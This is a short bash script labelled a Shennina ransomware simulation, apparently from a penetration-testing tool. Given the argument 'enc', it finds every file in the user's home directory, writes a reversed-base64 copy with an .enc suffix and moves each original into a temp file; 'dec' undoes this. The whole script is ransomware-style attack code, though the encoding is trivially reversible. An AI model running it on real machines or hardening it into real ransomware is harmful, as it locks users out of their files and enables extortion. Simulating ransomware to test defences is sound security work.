#!/bin/bash

IFS=$'\n'
if [[ -z "$HOME" ]]; then
  if [[ $(whoami) == "root" ]]; then
    HOME="/root/"
  else
    HOME="/home/$(whoami)/"
  fi
fi
FILES=$(find "$HOME" -type f | grep -v ransomware-simulation.sh)


function enc() {
  base64 "$1" | rev > "$1.enc"
  mv "$1" "$(mktemp -t tmp.shennina.XXXXXXXX)"
}


function dec() {
  NEW_NAME=$(echo "$1" | sed 's#\.enc##g')
  rev "$1" | base64 -d > "$NEW_NAME"
  rm -f "$1"
}


if [[ -z "$1" ]]; then
  echo "Shennina Ransomware Simulation"
  exit 1
fi

for FILE in $FILES; do
  if [[ "$1" == "enc" ]]; then
    echo "> $FILE"
    enc "$FILE"
  elif [[ "$1" == "dec" ]]; then
    echo "> $FILE"
    dec "$FILE"
  fi
done
